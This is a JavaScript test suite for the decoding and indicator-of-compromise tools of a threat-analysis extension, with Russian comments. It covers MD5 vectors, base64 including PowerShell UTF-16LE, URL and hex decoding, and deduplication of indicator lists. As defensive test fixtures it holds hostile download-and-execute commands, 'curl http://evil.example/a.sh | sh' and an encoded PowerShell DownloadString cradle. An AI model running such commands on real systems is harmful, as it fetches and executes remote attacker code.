/* Проверка локальных текстовых инструментов. Запуск:
 *   node extension/lib/textools.test.js
 *
 * Главное здесь — не «функция что-то вернула», а три вещи, каждая
 * из которых уводит расследование в сторону, если сломана:
 *   1. MD5 считается ВЕРНО. Хеш, посчитанный неправильно, не совпадёт
 *      с отчётом, и аналитик решит, что перед ним другой файл.
 *   2. Base64 из PowerShell читается как UTF-16LE, а не как UTF-8:
 *      иначе расшифровка выглядит мусором при верном результате.
 *   3. Хеш из отчёта не принимается за base64 — по алфавиту он подходит.
 */
'use strict';
const T = require('./textools.js');
const IOC = require('./ioc.js');

let pass = 0, fail = 0;
function check(name, cond, detail) {
  if (cond) { pass++; }
  else { fail++; console.error(`  FAIL  ${name}` + (detail ? `\n        ${detail}` : '')); }
}

/* ---------------------------------------------- MD5: векторы RFC 1321 --- */
{
  const vectors = [
    ['', 'd41d8cd98f00b204e9800998ecf8427e'],
    ['a', '0cc175b9c0f1b6a831c399e269772661'],
    ['abc', '900150983cd24fb0d6963f7d28e17f72'],
    ['message digest', 'f96b697d7cb7938d525a2f31aaf161d0'],
    ['abcdefghijklmnopqrstuvwxyz', 'c3fcd3d76192e4007dfb496cca67e13b'],
    ['ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',
     'd174ab98d277d9f5a5611c2c9f419d9f'],
    ['12345678901234567890123456789012345678901234567890123456789012345678901234567890',
     '57edf4a22be3c955ac49da2e2107b67a'],
  ];
  for (const [input, expect] of vectors) {
    check(`MD5("${input.slice(0, 24)}${input.length > 24 ? '…' : ''}")`,
          T.md5(input) === expect, `получено ${T.md5(input)}, ожидалось ${expect}`);
  }
  // Граница блока: 55, 56 и 64 байта — классические места, где ломается
  // выравнивание. Сверяем с реализацией Node, а не с собой.
  const crypto = require('crypto');
  for (const n of [54, 55, 56, 57, 63, 64, 65, 119, 120, 128]) {
    const s = 'x'.repeat(n);
    check(`MD5 длины ${n} совпадает с эталоном`,
          T.md5(s) === crypto.createHash('md5').update(s).digest('hex'));
  }
  check('MD5 от кириллицы считается по UTF-8',
        T.md5('привет') === crypto.createHash('md5').update('привет', 'utf8').digest('hex'));
}

/* ------------------------------------------------------------- base64 --- */
{
  // Реальный вектор: PowerShell -EncodedCommand кодирует в UTF-16LE.
  const utf16 = Buffer.from('Get-Process | Out-File C:\\temp\\p.txt', 'utf16le').toString('base64');
  const r = T.decodeBase64(utf16);
  check('base64 раскодирован', r.ok);
  check('UTF-16LE распознан', r.encoding === 'UTF-16LE', r.encoding);
  check('выбран осмысленный текст', r.chosen.startsWith('Get-Process'), JSON.stringify(r.chosen));
  check('про PowerShell сказано вслух', /UTF-16LE/.test(r.note), r.note);
  check('второе прочтение тоже отдано', typeof r.utf8 === 'string');

  const utf8 = Buffer.from('curl http://evil.example/a.sh | sh', 'utf8').toString('base64');
  const r8 = T.decodeBase64(utf8);
  check('обычный UTF-8 не объявлен UTF-16', r8.encoding === 'UTF-8', r8.encoding);
  check('UTF-8 раскодирован верно', r8.chosen === 'curl http://evil.example/a.sh | sh');

  check('мусор не выдаётся за успех', T.decodeBase64('!!!не base64!!!').ok === false);
  check('пустая строка не падает', T.decodeBase64('').ok === false);

  check('кодирование обратимо',
        T.decodeBase64(T.encodeBase64('проверка 123')).chosen === 'проверка 123');
}

/* ------------------------------- хеш из отчёта — это НЕ base64 ---------- */
{
  const sha256 = 'd41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e';
  check('64 hex-символа не считаются base64', !T.looksLikeBase64(sha256),
        'иначе каждый хеш в отчёте предлагалось бы «раскодировать»');
  check('md5 не считается base64', !T.looksLikeBase64('d41d8cd98f00b204e9800998ecf8427e'));
  check('короткая строка не считается base64', !T.looksLikeBase64('QUJD'));
  check('настоящий base64 распознан',
        T.looksLikeBase64(Buffer.from('это довольно длинная строка для теста').toString('base64')));
}

/* ------------------------------------------------- поиск base64 в тексте */
{
  const cmd = 'cmd.exe /c powershell -NonInteractive -enc '
    + Buffer.from('IEX (New-Object Net.WebClient).DownloadString("http://evil.example/a")', 'utf16le').toString('base64')
    + ' && echo done';
  const found = T.findBase64(cmd);
  check('строка за -enc найдена', found.length >= 1, JSON.stringify(found));
  check('источник назван', found[0] && /EncodedCommand/.test(found[0].from), found[0] && found[0].from);
  const decoded = T.decodeBase64(found[0].value);
  check('она раскодировалась в команду', /DownloadString/.test(decoded.chosen), decoded.chosen);
  /* Смысл всей операции: из раскодированной команды ИЗВЛЕКАЕТСЯ
   * индикатор. Парсер отдаёт URL целиком — это и правильно: адрес
   * с путём точнее голого домена. */
  check('в раскодированном есть индикатор',
        IOC.extractIocs(decoded.chosen).some((i) => i.value === 'http://evil.example/a'),
        JSON.stringify(IOC.extractIocs(decoded.chosen).map((i) => i.value)));

  // Текст отчёта с хешами не должен давать ложных находок.
  const report = 'Хеш-суммы файлов: ccfc37014ce6183bb9268e15e8569fc870e3ccc1123fc2fac9cf43862369f335 '
    + 'и 023a8a4e54dd9264a7d0cca3fd08cae15c661c91bb477dfc08a5c0f9939fb5cb';
  check('хеши не выдаются за base64', T.findBase64(report).length === 0,
        JSON.stringify(T.findBase64(report)));
}

/* ---------------------------------------------------------------- URL --- */
{
  check('URL раскодирован', T.decodeUrl('http%3A%2F%2Fevil%2Eexample%2Fa%20b').value
        === 'http://evil.example/a b');
  check('двойное кодирование раскручено',
        T.decodeUrl('http%253A%252F%252Fevil.example').value === 'http://evil.example');
  check('битая последовательность не падает', T.decodeUrl('%zz').ok === false);
  check('кодирование работает', T.encodeUrl('a b&c') === 'a%20b%26c');
}

/* ---------------------------------------------------------------- hex --- */
{
  check('hex в текст', T.hexToText('68 74 74 70').value === 'http');
  check('hex с 0x и двоеточиями', T.hexToText('0x68:0x74:74:70').value === 'http');
  check('нечётная длина отклонена', T.hexToText('abc').ok === false);
  check('не hex отклонён', T.hexToText('zz').ok === false);
  check('текст в hex', T.textToHex('http') === '68747470');
  check('обратимо', T.hexToText(T.textToHex('привет')).value === 'привет');
}

/* --------------------------------------------------------------- хеши --- */
{
  const crypto = require('crypto');
  (async () => {
    const h = await T.hashText('abc');
    check('SHA-1 совпадает с эталоном',
          h.sha1 === crypto.createHash('sha1').update('abc').digest('hex'), h.sha1);
    check('SHA-256 совпадает с эталоном',
          h.sha256 === crypto.createHash('sha256').update('abc').digest('hex'), h.sha256);
    check('SHA-512 совпадает с эталоном',
          h.sha512 === crypto.createHash('sha512').update('abc').digest('hex'));
    check('MD5 посчитан рядом', h.md5 === '900150983cd24fb0d6963f7d28e17f72');
    check('размер входа назван', h.bytes === 3);

    /* ------------------------------------------- дедупликация списка --- */
    const list = `45.151.45[.]31
      45.151.45.31
      EVIL.com
      evil[.]com
      d41d8cd98f00b204e9800998ecf8427e`;
    const d = T.dedupeList(list, IOC);
    check('дубликаты схлопнуты', d.unique === 3, JSON.stringify(d.items.map((i) => i.value)));
    check('исходное число сохранено', d.total === 5, String(d.total));
    check('дубликаты посчитаны', d.duplicates === 2, String(d.duplicates));
    check('дефанг снят при дедупликации',
          d.items.some((i) => i.value === '45.151.45.31'));
    check('регистр не плодит записи',
          d.items.filter((i) => i.value.toLowerCase() === 'evil.com').length === 1);
    check('повторы посчитаны по значению',
          d.items.find((i) => i.value === '45.151.45.31').count === 2);
    check('подсчёт по типам есть', d.byType.ipv4 === 1 && d.byType.domain === 1
          && d.byType.md5 === 1, JSON.stringify(d.byType));
    check('подпись типа человекочитаема',
          d.items.every((i) => typeof i.typeLabel === 'string' && i.typeLabel.length > 1),
          JSON.stringify(d.items.map((i) => i.typeLabel)));
    check('пустой ввод не падает', T.dedupeList('', IOC).unique === 0);

    /* ------------------------------------- сравнение двух списков --- */
    const older = '45.151.45[.]31\n46.166.79.31\nevil.com';
    const newer = '45.151.45.31\nevil[.]com\nnew-c2.example\n8.8.8.8';
    const df = T.diffLists(older, newer, IOC);
    check('добавленные найдены', df.onlyB.sort().join() === '8.8.8.8,new-c2.example',
          JSON.stringify(df.onlyB));
    check('исчезнувшие найдены', df.onlyA.join() === '46.166.79.31', JSON.stringify(df.onlyA));
    check('общие найдены', df.common === 2, String(df.common));
    check('ДЕФАНГ НЕ СОЗДАЁТ ЛОЖНЫХ ДОБАВЛЕНИЙ',
          !df.onlyB.includes('evil.com') && !df.onlyA.includes('evil[.]com'),
          'evil[.]com и evil.com — одно значение, иначе весь список выглядит новым');
    check('счётчики совпадают с длинами',
          df.countA === 3 && df.countB === 4 && df.added === 2 && df.removed === 1);
    check('пустой второй список — всё исчезло',
          T.diffLists('a.com', '', IOC).removed === 1);
    check('пустые списки не падают', T.diffLists('', '', IOC).common === 0);
    check('повторы внутри списка не плодят записей',
          T.diffLists('a.com a.com A.COM', 'a.com', IOC).countA === 1);

    console.log(`\n  Пройдено: ${pass}   Провалено: ${fail}\n`);
    process.exit(fail ? 1 : 0);
  })();
}
